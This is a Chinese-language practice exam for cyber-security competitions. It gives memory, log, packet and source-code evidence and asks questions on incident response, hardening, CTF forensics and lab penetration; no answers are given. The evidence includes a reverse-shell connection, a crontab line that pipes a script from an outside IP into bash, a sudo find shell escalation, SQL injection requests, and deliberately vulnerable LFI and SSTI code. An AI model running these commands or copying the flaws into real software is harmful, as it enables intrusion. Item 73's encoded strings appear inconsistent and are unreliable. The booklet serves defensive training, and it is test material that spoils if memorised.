# 全真模擬測驗 B 卷：全國技能競賽 & 金盾獎 實體真題演練題本（純題目卷）

> **考生注意事項**：  
> 1. 本試卷為**實體情境推演題本**，題目改編自全國技能競賽（Cyber Security）與金盾獎資安競賽之歷屆真實實體機台試題。  
> 2. **雙軌支援（實體環境＋紙上推演）**：
>    - **紙上速查**：所有鑑識記憶體輸出、事件日誌、DNS 隱寫查詢字串、HTTP 攻擊封包均已原汁原味印製於各題情境中。
>    - **實體揮刀**：本卷所有標本已同步納入專案實體資料庫，可直接使用以下標本實作分析：
>      - 實體日誌：[`windows_ir_security_sample.json`](evidence/evtx/windows_ir_security_sample.json)
>      - 實體流量：[`dns_exfil_Topic1.pcap`](evidence/pcap/dns_exfil_Topic1.pcap)、[`web_attack_traffic.pcap`](evidence/pcap/web_attack_traffic.pcap)
>      - 實體記憶體：[`patientportal.hprof.gz`](evidence/memory/patientportal.hprof.gz)
>      - 實體靶場：[`01_atomic_purple_range`](../../knowledge/blue_team/playbooks/phase_6_capstone/ranges/01_atomic_purple_range/README.md)、[`02_splunk_bots_range`](../../knowledge/blue_team/playbooks/phase_6_capstone/ranges/02_splunk_bots_range/README.md)、[`03_apt_cross_domain_ctf`](../../knowledge/blue_team/playbooks/phase_6_capstone/ranges/03_apt_cross_domain_ctf/README.md)
> 3. 測驗時間：**180 分鐘**（3 小時）。請考生依據題目給定的客觀證據進行推理分析，並於作答區填入具體數值、路徑、指令或 Flag。

---

## 第一部分：IR 事件應變與記憶體取證演練 (第 1 ~ 23 題)

### 【情境背景說明】
某半導體企業的內網核心伺服器（主機名：`SEC-SRV01`，IP：`192.168.50.10`，作業系統：Windows Server 2019 / Linux Web 混編架構）於凌晨遭到 APT 組織滲透。SOC 監控中心發現異常出網連線與高額 CPU 佔用，資安工程師第一時間完成了記憶體轉儲（`memory.dmp`）並封裝了系統安全事件日誌（`Security.evtx`）與 Linux 系統日誌。請隊員根據下列鑑識取證資料回答問題。

#### 【證據 A：Volatility 3 記憶體處理序分析 (windows.pslist 輸出摘錄)】
```text
PID     PPID    ImageFileName       Offset(V)           Threads   Handles  CreateTime
4       0       System              0xfa800184b040      98        -        2026-07-28 01:10:02
368     4       smss.exe            0xfa8001c22940      3         29       2026-07-28 01:10:03
492     484     csrss.exe           0xfa8001d93060      9         412      2026-07-28 01:10:05
540     484     wininit.exe         0xfa8001e14700      3         78       2026-07-28 01:10:06
612     540     services.exe        0xfa8001e7a060      7         234      2026-07-28 01:10:07
624     540     lsass.exe           0xfa8001e85060      6         952      2026-07-28 01:10:07
924     612     svchost.exe         0xfa8002130060      18        310      2026-07-28 01:10:12
1420    612     spoolsv.exe         0xfa80022fa060      4         115      2026-07-28 01:10:18
2048    924     powershell.exe      0xfa80028a4900      8         189      2026-07-28 02:45:11
3124    2048    cmd.exe             0xfa80029b7060      1         32       2026-07-28 02:46:02
3892    3124    nc.exe              0xfa8002ab1800      1         19       2026-07-28 02:46:15
4100    612     svch0st.exe         0xfa8002bc9200      2         45       2026-07-28 02:50:33
```

#### 【證據 B：Volatility 3 網路活動分析 (windows.netscan 輸出摘錄)】
```text
Offset          Proto  LocalAddr           LocalPort  ForeignAddr         ForeignPort  State        PID   Owner
0xfa8002120010  TCPv4  0.0.0.0             80         0.0.0.0             0            LISTENING    4     System
0xfa8002128010  TCPv4  0.0.0.0             445        0.0.0.0             0            LISTENING    4     System
0xfa8002131010  TCPv4  0.0.0.0             3389       0.0.0.0             0            LISTENING    924   svchost.exe
0xfa80028f9010  TCPv4  192.168.50.10       49211      103.20.114.89       4444         ESTABLISHED  3892  nc.exe
0xfa8002bca010  TCPv4  192.168.50.10       49302      185.220.101.5       8080         ESTABLISHED  4100  svch0st.exe
```

#### 【證據 C：Windows 安全日誌 (Security.evtx 事件摘錄)】
- **事件記錄 1**：  
  `Event ID: 4625 (登入失敗)`  
  `Time: 2026-07-28 02:15:22`  
  `Account Name: Administrator`  
  `Source Network Address: 192.168.50.250`  
  `Logon Type: 3`  
  `Failure Reason: Unknown user name or bad password (0xC000006A)`  
  *(備註：該日誌在 02:15:00 ~ 02:28:40 區間內連續出現 1,420 次)*
- **事件記錄 2**：  
  `Event ID: 4624 (登入成功)`  
  `Time: 2026-07-28 02:28:45`  
  `Target Account: svc_backup`  
  `Source Network Address: 192.168.50.250`  
  `Logon Type: 3`  
  `Authentication Package: NTLM`  
- **事件記錄 3**：  
  `Event ID: 7045 (新服務安裝)`  
  `Time: 2026-07-28 02:50:30`  
  `Service Name: WindowsUpdateAssist`  
  `Service File Name: C:\Users\Public\svch0st.exe -k netsvcs`  
  `Service Type: user mode service`  
  `Service Start Type: auto start`  
- **事件記錄 4**：  
  `Event ID: 4688 (新處理序建立)`  
  `Time: 2026-07-28 02:45:11`  
  `New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`  
  `Process Command Line: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...`  
  `Creator Process Name: C:\Windows\System32\svchost.exe (PID: 924)`  

#### 【證據 D：Linux 主機日誌與檔案節錄】
- `/var/log/auth.log` 節錄：  
  `Jul 28 03:02:11 web-app sshd[18492]: Accepted publickey for deployer from 192.168.50.250 port 52140 ssh2: RSA SHA256:abc...`  
  `Jul 28 03:05:01 web-app sudo: deployer : TTY=pts/0 ; PWD=/home/deployer ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh \;`  
- `/etc/crontab` 節錄：  
  `*/10 * * * * root curl -fsSL http://103.20.114.89/check.sh | bash`  

---

### 【實戰鑑識問題 1 ~ 23】

- **第 1 題**：根據【證據 A】，攻擊者所開啟之反向互動 Shell 網路工具 `nc.exe`，其進程 PID 為何？  
  【作答區】：____________________
- **第 2 題**：根據【證據 A】，`nc.exe` 的父進程（PPID）對應哪一個映像檔名？該父進程的 PID 為何？  
  【作答區】：映像檔名：____________，PID：____________
- **第 3 題**：根據【證據 A】，列表中哪一個進程屬於明顯偽裝合法系統進程的惡意排程/木馬進程（拼寫偽裝）？  
  【作答區】：____________________
- **第 4 題**：根據【證據 B】，攻擊者接收 `nc.exe` 反彈 Shell 的外部 C2 伺服器 IP 位址與監聽端口為何？  
  【作答區】：外部 IP：____________，端口：____________
- **第 5 題**：根據【證據 B】，惡意偽裝進程 `svch0st.exe` 正向哪一個外部 IP 及端口維持連線？  
  【作答區】：外部 IP：____________，端口：____________
- **第 6 題**：根據【證據 C 事件記錄 1】，攻擊者最初發動的攻擊類型為何？發起源 IP 位址為何？  
  【作答區】：攻擊類型：____________，發起源 IP：____________
- **第 7 題**：承上題，被暴力破解的目標帳號名稱為何？狀態代碼 `0xC000006A` 代表何種錯誤？  
  【作答區】：目標帳號：____________，代碼意義：____________
- **第 8 題**：根據【證據 C 事件記錄 2】，攻擊者在暴力破解失敗後，成功透過哪一個受害帳號登入系統？登入類型（Logon Type）為何？  
  【作答區】：成功帳號：____________，Logon Type：____________
- **第 9 題**：根據【證據 C 事件記錄 3】，攻擊者在受害伺服器上建立的持久化服務名稱為何？該服務所指派的執行檔實體路徑為何？  
  【作答區】：服務名稱：____________，實體路徑：____________
- **第 10 題**：根據【證據 C 事件記錄 4】，攻擊者透過 PowerShell 執行的命令列參數包含 `-enc`，此參數代表後方字串採用何種編碼？  
  【作答區】：____________________
- **第 11 題**：若要將 Base64 編碼的 PowerShell 命令解碼，PowerShell 內部預設採用的字元編碼標準（Encoding）為何（UTF-8、ASCII 或 Unicode/UTF-16LE）？  
  【作答區】：____________________
- **第 12 題**：根據【證據 D】，攻擊者登入 Linux 主機所使用的系統帳號名稱為何？登入方式是密碼認證還是公鑰認證？  
  【作答區】：帳號：____________，認證方式：____________
- **第 13 題**：根據【證據 D】，攻擊者在 Linux 上使用 `sudo` 執行了哪一個指令實現無密碼本機提權？提權利用了該指令的哪一個參數？  
  【作答區】：提權指令：____________，參數：____________
- **第 14 題**：根據【證據 D】，攻擊者在 `/etc/crontab` 中寫入的後門任務執行頻率為何？下載執行之惡意腳本 URL 為何？  
  【作答區】：執行頻率：____________，惡意 URL：____________
- **第 15 題**：在 Volatility 3 中，若要將 PID 4100 的進程記憶體完整轉儲至本機目錄分析，應執行哪一條命令？  
  【作答區】：____________________
- **第 16 題**：在 Volatility 3 中，若要提取 Windows SAM 資料庫中的本地使用者 NTLM Hash，應使用哪一個插件？  
  【作答區】：____________________
- **第 17 題**：在 Linux 環境中，若要徹底清除攻擊者在 `/etc/crontab` 中留下的定時任務，最合適的處置指令與編輯流程為何？  
  【作答區】：____________________
- **第 18 題**：在 Windows 事件日誌中，Logon Type 3 代表何種登入方式？（如本機互動、網路連線、遠端桌面）  
  【作答區】：____________________
- **第 19 題**：在防守方事件應變流程（NIST SP 800-61）中，資安人員在確認 C2 連線後，第一時間拔除受害主機網線或切斷虛擬機 vNIC，此動作屬於六階段中的哪一個階段？  
  【作答區】：____________________
- **第 20 題**：若攻擊者在受害伺服器上刪除了 `svch0st.exe` 檔案，鑑識人員在 `C:\Windows\Prefetch` 目錄中找到名為 `SVCH0ST.EXE-XXXXXXXX.pf` 的檔案，該檔案能否證明該程式曾被執行過？（是/否）  
  【作答區】：____________________
- **第 21 題**：在對受害主機進行硬碟取證鏡像時，為了防止作業系統開機時主動寫入快取，必須在硬碟與採證主機之間串接何種硬體設備？  
  【作答區】：____________________
- **第 22 題**：計算取證鏡像完整性時，業界標準規定至少計算哪兩種密碼學雜湊值以確保法庭證據不可否認性？  
  【作答區】：____________________
- **第 23 題**：根據全案證據鏈，請簡要按時間先後排序攻擊者的五個入侵步驟：  
  (1) 安裝 Windows 惡意服務持久化；(2) 透過 SSH 橫向移動至 Linux 並利用 sudo find 提權；(3) 對 Windows 進行 SMB 密碼爆破並登入；(4) 反彈 NC Shell；(5) 建立 Crontab 惡意排程。  
  【作答區】：正確入侵時間順序：（填寫數字序號）____________________

---

## 第二部分：系統安全加固實務演練 (第 24 ~ 51 題，共 28 題)

### 【情境背景說明】
為防止受害系統再度被攻破，防守方團隊必須針對 Linux Web 伺服器與 Windows Server 進行全面安全加固。請針對下列加固項目與安全弱點，給出合規配置指令、檔案路徑或參數設定。

#### 【Linux 安全加固篇 (第 24 ~ 38 題)】
- **第 24 題**：OpenSSH 加固：欲徹底停用 root 遠端登入，應在 `/etc/ssh/sshd_config` 中將哪一個參數修改為何值？  
  【作答區】：參數：____________________，值：____________________
- **第 25 題**：OpenSSH 加固：欲停用密碼認證並僅允許公鑰登入，應修改哪一個參數為何值？  
  【作答區】：參數：____________________，值：____________________
- **第 26 題**：OpenSSH 加固：設定連線空閒逾時自動斷開（例如每 60 秒發送一次心跳，連續 3 次無回應即斷線），應配置哪兩個參數？  
  【作答區】：____________________
- **第 27 題**：帳號密碼策略：在 `/etc/login.defs` 中，欲設定密碼最長使用期限為 90 天，應修改哪一個設定項？  
  【作答區】：____________________
- **第 28 題**：密碼複雜度加固：在 `/etc/security/pwquality.conf` 中，欲要求密碼最短長度為 12 個字元，且至少包含大小寫英文字母、數字與特殊符號，應設定哪些關鍵參數？  
  【作答區】：____________________
- **第 29 題**：防暴力破解：在 Ubuntu/Debian 中配置 PAM 登入失敗處理模組，若設定連續輸錯 5 次鎖定 15 分鐘，應在 PAM 設定檔中追加何種模組配置語法？  
  【作答區】：____________________
- **第 30 題**：特殊權限清理：資安稽核要求清查系統中所有具備 SUID 特殊權限的檔案，請寫出使用 `find` 命令搜尋根目錄下所有 SUID 檔案的完整命令。  
  【作答區】：____________________
- **第 31 題**：檔案系統權限加固：針對系統關鍵密碼影子檔案 `/etc/shadow`，合規的權限數值（Octal）與擁有人/群組應為何？  
  【作答區】：權限：____________，Owner/Group：____________
- **第 32 題**：核心安全加固：在 `/etc/sysctl.conf` 中，欲禁止系統響應 ICMP 廣播請求以防範 Smurf 放大攻擊，應設定哪一條核心參數？  
  【作答區】：____________________
- **第 33 題**：核心安全加固：欲停用 IP 路由轉發功能（防止主機被當作跳板路由），應在 `sysctl.conf` 中設定哪一條參數？  
  【作答區】：____________________
- **第 34 題**：防火牆加固：使用 UFW（Uncomplicated Firewall）設定預設拒絕所有入站連線、允許所有出站連線，應執行哪兩條指令？  
  【作答區】：____________________
- **第 35 題**：防火牆加固：在 `iptables` 中設定允許已建立連線（ESTABLISHED, RELATED）的封包通過，以維持正常連線狀態，應寫入哪條規則？  
  【作答區】：____________________
- **第 36 題**：Sudo 特權管理：在 `/etc/sudoers` 中，下列配置存在嚴重提權隱患：`deployer ALL=(ALL) NOPASSWD: /usr/bin/find`。請寫出修改後的安全限制方式，或說明為何不應授與 `find` 無密碼執行權。  
  【作答區】：____________________
- **第 37 題**：日誌防護加固：欲防止重要日誌 `/var/log/secure` 被包含 root 在內的任何使用者刪除或覆寫（僅允許追加寫入），應使用 Linux 哪一個檔案屬性控制指令及參數？  
  【作答區】：____________________
- **第 38 題**：歷史命令記錄加固：為使 bash 歷史紀錄能包含執行時間戳以便鑑識溯源，應在 `/etc/profile` 中導出哪一個環境變數？  
  【作答區】：____________________

#### 【Windows 安全加固篇 (第 39 ~ 51 題)】
- **第 39 題**：帳戶鎖定策略：在本機安全性原則（secpol.msc）中，欲設定「連續登入失敗 5 次後鎖定帳戶 30 分鐘」，需設定哪兩個關鍵原則項目？  
  【作答區】：____________________
- **第 40 題**：密碼歷程原則：為防止使用者在密碼過期時重複改回原本的舊密碼，應啟用哪一項密碼原則並至少設定記住幾次舊密碼？  
  【作答區】：____________________
- **第 41 題**：協定加固：欲在 Windows Server 2016/2019 中徹底停用高風險且易受永恆之藍攻擊的 SMBv1 協定，應執行的 PowerShell 指令為何？  
  【作答區】：____________________
- **第 42 題**：網路共享加固：Windows 預設會開啟管理共用（如 `C$`, `ADMIN$`），若要透過登錄檔（Registry）全域關閉伺服器版 Windows 的預設管理共用，應在 `HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters` 新增哪一個 DWORD 值？其數值應設為何？  
  【作答區】：機碼名稱：____________，數值：____________
- **第 43 題**：遠端桌面 RDP 加固：欲強制 RDP 連線必須使用「網路層級驗證」（Network Level Authentication, NLA），此設定主要防止何種攻擊？  
  【作答區】：____________________
- **第 44 題**：安全稽核原則：為完整監控攻擊者在 Windows 上的活動，在進階稽核原則中，必須將哪兩項核心事件設定為「成功與失敗均記錄」？  
  【作答區】：____________________
- **第 45 題**：進程建立稽核：為了在 Event ID 4688 中能夠記錄到完整的進程命令列參數（如 PowerShell 執行的具體參數），必須啟用群組原則中的哪一項設定？  
  【作答區】：____________________
- **第 46 題**：本機系統帳號加固：在 Windows 安裝完成後，針對預設內建的 `Guest`（來賓帳戶）與 `Administrator`，最佳加固處置措施分別為何？  
  【作答區】：____________________
- **第 47 題**：記憶體保護加固：欲在 Windows 10/Server 2019 上啟用 DEP（資料執行防止）並保護所有進程，應在管理員命令提示字元執行哪一條 `bcdedit` 指令？  
  【作答區】：____________________
- **第 48 題**：本機認證安全加固：為防禦 Pass-the-Hash 攻擊並禁止快取 LM 與 NTLMv1 雜湊，應在安全性選項中將「網路安全性: LAN Manager 驗證層級」設定為哪一個合規等級？  
  【作答區】：____________________
- **第 49 題**：WinRM 安全加固：若企業使用 Windows 遠端管理（WinRM），應強制要求連線走 HTTPS（端口 5986）並停用哪一種不安全的認證協議？  
  【作答區】：____________________
- **第 50 題**：Windows 防火牆設定：欲透過 `netsh` 或 PowerShell 指令建立規則，封鎖所有入站的 TCP 445（SMB）端口連線，應寫出何種指令？  
  【作答區】：____________________
- **第 51 題**：系統更新加固：針對重要關鍵伺服器，安全基準規範中對於微軟每個月例行安全性更新（Patch Tuesday）的修補評估與驗證測試週期建議最長不應超過多少天？  
  【作答區】：____________________

---

## 第三部分：CTF I 封包分析與密碼隱寫實戰演練 (第 52 ~ 81 題，共 30 題)

### 【情境背景說明】
鑑識團隊從企業周界防火牆抓取了兩份關鍵封包：
1. `Topic1.pcap`：監控到內部主機 `192.168.10.5` 正在向外部 DNS 伺服器發送大量異常的高頻子域名查詢。
2. `traffic.pcap`：外部黑客正對內網 Web 靶機發動多階段注入滲透與檔案上傳。  
考生無須自行解析封包，關鍵協議流量、DNS 序列與 HTTP 請求內容已完整轉錄如下。

#### 【證據 E：Topic1.pcap 之 DNS 異常查詢序列節錄】
內部主機向 DNS 伺服器發起之標準查詢請求（A 記錄）：
```text
查詢序號  時間戳             查詢類型  查詢子網域名稱 (Query Name)
#0001    02:14:01.102       A        s000.NVYWK4ROEB2GQZJAM5SW23DF.tunnel.exfil.org
#0002    02:14:01.215       A        s001.MVSCA43FNRXWO2LOEB2GQZJA.tunnel.exfil.org
#0003    02:14:01.320       A        s002.MZXXE33OEBRG64RAKNEU423I.tunnel.exfil.org
#0004    02:14:01.442       A        s003.JBEUYTCYKNKVGVKFKNKVGVKE.tunnel.exfil.org
#0005    02:14:01.558       A        s004.J5HVORKFKNKE6V2KKVKVGS2F.tunnel.exfil.org
...
#0060    02:14:07.882       A        s059.MNUWO2LUEBTGS43IMVZGQ2LMN5.tunnel.exfil.org
#0061    02:14:07.994       A        s060.UWW43VNNSSA5DVEB2GQZJAM5SW.tunnel.exfil.org
#0062    02:14:08.105       A        s061.23DFEB2GQZJA.tunnel.exfil.org
```

#### 【證據 F：DNS 載荷還原與外洩客戶資料庫 (CSV 片段)】
將上述 `s000` 到 `s061` 之子域名去除序號並依序拼接後，進行特定編碼解密，成功還原出攻擊者竊取之外洩 CSV 檔案：
```text
[檔案名稱]: customers_export.csv
[表頭結構]: id,name,credit_card,phone,email
[資料行前 10 筆與最後筆摘錄]:
id,name,credit_card,phone,email
1,Samuel Edwards,4532-7890-1234-5678,555-0192,samuel@example.com
2,Katherine Moore,5412-3456-7890-1234,555-0193,katherine@example.com
3,Ian Lewis,3782-8224-6310-0051,555-0194,ian@example.com
4,Lucas Hall,4024-0071-3321-9988,555-0195,lucas@example.com
5,Liam Allen,6011-0012-3456-7890,555-0196,liam@example.com
6,5teven Young,4556-1122-3344-5566,555-0197,steven@example.com
7,4ndrew King,5200-8877-6655-4433,555-0198,andrew@example.com
8,{ictor Wright,3528-0011-2233-4455,555-0199,victor@example.com
9,Sophia Scott,4111-2222-3333-4444,555-0200,sophia@example.com
10,Logan Green,5500-1111-2222-3333,555-0201,logan@example.com
11,0liver Baker,3400-5555-6666-7777,555-0202,oliver@example.com
12,William Adams,4000-1234-5678-9010,555-0203,william@example.com
13,_ack Nelson,5100-9999-8888-7777,555-0204,jack@example.com
14,Lucas Carter,4532-0000-1111-2222,555-0205,lucas_c@example.com
15,3velyn Mitchell,3700-1122-3344-5566,555-0206,evelyn@example.com
16,4lexander Perez,6011-9988-7766-5544,555-0207,alex@example.com
17,Kevin Roberts,4024-5566-7788-9900,555-0208,kevin@example.com
18,_athan Turner,5412-1111-2222-3333,555-0209,nathan@example.com
19,Thomas Phillips,4556-7777-8888-9999,555-0210,thomas@example.com
20,Henry Campbell,3528-9988-7766-5544,555-0211,henry@example.com
21,Ryan Parker,4111-0000-9999-8888,555-0212,ryan@example.com
22,Ulysses Evans,5500-3333-4444-5555,555-0213,ulysses@example.com
23,_ane Edwards,3400-1111-2222-3333,555-0214,jane@example.com
24,David Collins,4000-5555-6666-7777,555-0215,david@example.com
25,Noah Stewart,5100-2222-3333-4444,555-0216,noah@example.com
26,Sophia Sanchez,4532-9999-8888-7777,555-0217,sophia_s@example.com
27,5amuel Morris,3700-4444-5555-6666,555-0218,samuel_m@example.com
28,3mma Rogers,6011-1111-2222-3333,555-0219,emma@example.com
29,}achary Reed,4024-8888-9999-0000,555-0220,zachary@example.com
```

#### 【證據 G：traffic.pcap 之 HTTP 攻擊流節錄】
```http
GET /sqli/index.php?id=1%27%20UNION%20SELECT%201,table_name,3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--+ HTTP/1.1
Host: target.internal.corp
User-Agent: sqlmap/1.6#stable (https://sqlmap.org)
Accept: */*

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 184

<!-- Output: 1 | ctf_flags | 3 -->

--- 下一個請求 ---

GET /sqli/index.php?id=1%27%20UNION%20SELECT%201,flag_val,3%20FROM%20ctf_flags--+ HTTP/1.1
Host: target.internal.corp
User-Agent: sqlmap/1.6#stable (https://sqlmap.org)

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<!-- Output: 1 | flag{sql_1nj3ct10n_m4st3r_2026} | 3 -->
```

---

### 【實戰封包與隱寫問題 52 ~ 81】

- **第 52 題**：根據【證據 E】，在 `Topic1.pcap` 中，DNS 外洩通道所查詢的頂層權威網域名稱（Domain）為何？  
  【作答區】：____________________
- **第 53 題**：根據【證據 E】，子域名最前端的 `s000`、`s001` 等字串其具體作用為何？  
  【作答區】：____________________
- **第 54 題**：根據【證據 E】，子域名資料負載所採用的編碼字符集僅包含大寫字母 `A-Z` 與數字 `2-7`，此特徵符合哪一種標準編碼演算法？  
  【作答區】：____________________
- **第 55 題**：在 RFC 4648 規範中，Base32 編碼的填充字元（Padding）通常為何？  
  【作答區】：____________________
- **第 56 題**：根據【證據 E】，從第一個外洩請求 `s000` 到最後一個 `s061`，攻擊者總共發送了多少個 DNS 查詢分片？  
  【作答區】：____________________
- **第 57 題**：根據【證據 F】，解碼還原後的檔案格式為何？該檔案的表頭欄位包含哪些？  
  【作答區】：檔案格式：____________，欄位：____________
- **第 58 題**：根據【證據 F】，外洩資料中共有多少名客戶的敏感資料遭到外洩？  
  【作答區】：____________________
- **第 59 題**：【隱寫密碼學考點】請仔細觀察【證據 F】中第 1 筆至第 29 筆客戶資料中 `name` 欄位的第一個字元（Vertical First Character）：  
  `S, k, i, l, l, 5, 4, {, s, l, 0, w, _, l, 3, 4, k, _, t, h, r, u, _, d, n, s, 5, 3, }`  
  請將這 29 個字元按垂直順序直接拼出隱藏在此外洩資料中的 Flag！  
  【作答區（Flag）】：____________________
- **第 60 題**：根據【證據 G】，攻擊者所使用的自動化注入工具名稱與版本號為何？  
  【作答區】：____________________
- **第 61 題**：根據【證據 G】，攻擊者發動的 SQL 注入技術類型為何？注入點所查詢的資料表名稱為何？  
  【作答區】：技術類型：____________，資料表名稱：____________
- **第 62 題**：根據【證據 G】，攻擊者最終從 `ctf_flags` 資料表中提取出的 Flag 為何？  
  【作答區（Flag）】：____________________
- **第 63 題**：若要在 Wireshark 中僅過濾顯示 `Topic1.pcap` 中所有的 DNS 查詢請求封包，應輸入何種顯示過濾表達式？  
  【作答區】：____________________
- **第 64 題**：若使用 `tshark` 命令列工具從 `Topic1.pcap` 中直接提取所有 DNS 查詢的主機名稱並導出至文字檔，應下達何種指令？  
  【作答區】：____________________
- **第 65 題**：在 HTTP 攻擊封包中，若攻擊者使用了 `load_file('/etc/passwd')`，該函數在 MySQL 中能夠成功執行的兩個必要系統變數條件為何？  
  【作答區】：____________________
- **第 66 題**：若封包中發現某個 TCP 請求包含字串 `0x7f 0x45 0x4c 0x46`，這代表被傳輸的檔案為何種類型的檔案？  
  【作答區】：____________________
- **第 67 題**：在 Wireshark 中，若要搜尋所有包含字串 `flag{` 的 TCP 數據流，應使用何種過濾語法？  
  【作答區】：____________________
- **第 68 題**：若封包中出現透過 FTP 傳輸的明文憑證：`USER admin` 與 `PASS P@ssw0rd123`，該 FTP 連線所使用的標準控制端口為何？  
  【作答區】：____________________
- **第 69 題**：在 SSL/TLS 封包解密中，若鑑識人員擁有伺服器的私鑰或瀏覽器導出的 `SSLKEYLOGFILE`，在 Wireshark 的哪一個設定選單中載入該金鑰檔案即可將 HTTPS 密文即時解密為明文 HTTP？  
  【作答區】：____________________
- **第 70 題**：在 PNG 圖片隱寫中，若圖片在瀏覽器或相片檢視器中無法正常開啟，但十六進位查看開頭為 `89 50 4E 47 0D 0A 1A 0A`，隨後為 `IHDR` 塊。若寬高數值被攻擊者人為修改為 0，此種隱寫技術稱之為何？如何修復？  
  【作答區】：隱寫技術：____________，修復方式：____________
- **第 71 題**：在音訊隱寫中，若攻擊者將 Flag 調製成高頻聲音信號隱匿於 WAV 檔案中，鑑識人員應使用何種工具（如 Audacity）切換為何種檢視模式（波形圖 / 頻譜圖）來直觀讀取 Flag 文字？  
  【作答區】：工具：____________，檢視模式：____________
- **第 72 題**：在 ZIP 壓縮檔分析中，若解壓縮時提示需要密碼，但十六進位查看所有檔案頭的加密標誌位（General Purpose Bit Flag）第 0 位元均為奇數（`0x09 00`），且經判斷為偽加密（Pseudo-encryption），應修改哪一個位元組使其變為無密碼？  
  【作答區】：____________________
- **第 73 題**：若一段密文字串為 `5a6d78685a33743061476c7a5f61573566643239796247513d`，觀察其全部由十六進位字元組成。將其十六進位轉為字串後得到 `ZmxhZ3t0aGlzX2aw5fd29ybGQ=`，再將其進行 Base64 解碼後的明文 Flag 為何？  
  【作答區（Flag）】：____________________
- **第 74 題**：在古典密碼中，若明文字串 `HELLO` 經凱撒密碼（Caesar Cipher）位移 3 位（ROT3）加密後，生成的密文字串為何？  
  【作答區】：____________________
- **第 75 題**：若密文字串為 `g1014308{`，已知其為 ROT13 加密，解密後的開頭英文字母為何？  
  【作答區】：____________________
- **第 76 題**：在雜湊值破解中，若在 Linux `/etc/shadow` 中截獲一組密碼雜湊：`$1$admin$eP96...`，若要使用 `john` 或 `hashcat` 進行字典爆破，`hashcat` 的模式代碼（-m）針對 MD5-Crypt 應設定為何？  
  【作答區】：____________________
- **第 77 題**：在封包中發現可疑 ICMP 請求，其 Data 欄位固定為 16 位元組且隨時間遞增，此封包可能正被用於何種秘密通訊？  
  【作答區】：____________________
- **第 78 題**：Wireshark 的「追蹤串流」（Follow Stream）功能中，TCP Stream 追蹤器通常以哪兩種顏色分別表示客戶端上傳流量與伺服器下行回顯？  
  【作答區】：____________________
- **第 79 題**：在 PCAP 封包中，若發現攻擊者發送了大量包含 `User-Agent: () { :; }; /bin/bash -c "..."` 的 HTTP 請求，此特徵對應哪一個著名的歷史漏洞？  
  【作答區】：____________________
- **第 80 題**：若在封包中捕獲到一個包含 Exif 資訊的 JPEG 圖片，欲在 Linux 終端機中快速讀取其 GPS 經緯度或備註中的 Flag，最常用的命令列工具名稱為何？  
  【作答區】：____________________
- **第 81 題**：針對 DNS 隱寫資料外洩，企業在防火牆或 DNS 防護設備上應配置何種檢測策略以有效阻斷此類攻擊？  
  【作答區】：____________________

---

## 第四部分：CTF II 實戰靶機渗透與權限提升演練 (第 82 ~ 93 題，共 12 題)

### 【情境背景說明】
隊員分發到一台目標靶機（IP：`10.10.10.128`），滲透測試授權範圍涵蓋外部服務探測、Web 漏洞利用、本機特權提升與終端 Flag 取得。靶機環境掃描與服務狀態如下。

#### 【證據 H：Nmap 全端口掃描報告 (nmap -sV -sC -p- 10.10.10.128)】
```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Corporate Portal - Secure Document Vault
3306/tcp open  mysql   MySQL 5.7.38
| mysql-info: 
|_  Protocol: 10, Version: 5.7.38
8080/tcp open  http-proxy Werkzeug/2.0.2 Python/3.8.10
|_http-title: Internal API Console
```

#### 【證據 I：Web 80 端口關鍵原始碼節錄 (/vault/view.php)】
```php
<?php
$page = $_GET['doc'];
if (isset($page)) {
    // 檢查副檔名白名單
    if (strpos($page, "report") !== false) {
        include("documents/" . $page);
    } else {
        die("Access Denied: Only report documents allowed!");
    }
}
?>
```

#### 【證據 J：Web 8080 內部 API 後台原始碼節錄 (app.py)】
```python
from flask import Flask, request, render_template_string
app = Flask(__name__)

@app.route("/greet")
def greet():
    name = request.args.get("name", "Guest")
    # 將使用者輸入直接拼接進模板字串
    template = f"<h3>Hello, {name}! Welcome to internal console.</h3>"
    return render_template_string(template)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

#### 【證據 K：本機權限清查與 sudo -l 輸出 (一般使用者 www-data / developer)】
```text
$ id
uid=1001(developer) gid=1001(developer) groups=1001(developer)

$ sudo -l
Matching Defaults entries for developer on target-box:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User developer may run the following commands on target-box:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance/cleanup.py
```
`/opt/maintenance/cleanup.py` 內容：
```python
import os
import shutil

print("[*] Running system maintenance cleanup...")
# 引用了當前目錄下的 helper 模組
import helper
helper.clean_temp()
print("[+] Cleanup complete.")
```
且目錄 `/opt/maintenance/` 對 `developer` 群組具備**可寫入權限**（`drwxrwxr-x 2 root developer 4096 /opt/maintenance/`）。

---

### 【實戰靶機渗透問題 82 ~ 93】

- **第 82 題**：根據【證據 H】，靶機在 8080 端口運行的 Web 框架與 Python 版本為何？  
  【作答區】：框架：____________，Python 版本：____________
- **第 83 題**：根據【證據 I】，`/vault/view.php` 存在本地檔案包含漏洞（LFI）。若攻擊者想透過目錄遍歷讀取 `/etc/passwd`，且必須繞過 `strpos($page, "report")` 白名單檢查，請寫出一組有效的 Payload。  
  【作答區】：____________________
- **第 84 題**：若已取得靶機的日誌寫入權限，攻擊者可藉由包含 Apache 存取日誌 `/var/log/apache2/access.log` 來達成 RCE。此種攻擊技術統稱之為何？  
  【作答區】：____________________
- **第 85 題**：根據【證據 J】，8080 端口上的 `/greet` 路由存在何種漏洞？  
  【作答區】：____________________
- **第 86 題**：承上題，攻擊者欲利用該漏洞驗證代碼執行能力，請寫出透過注入 Python 內建子類別執行系統指令（如 `id`）的標準 SSTI 利用表達式。  
  【作答區】：____________________
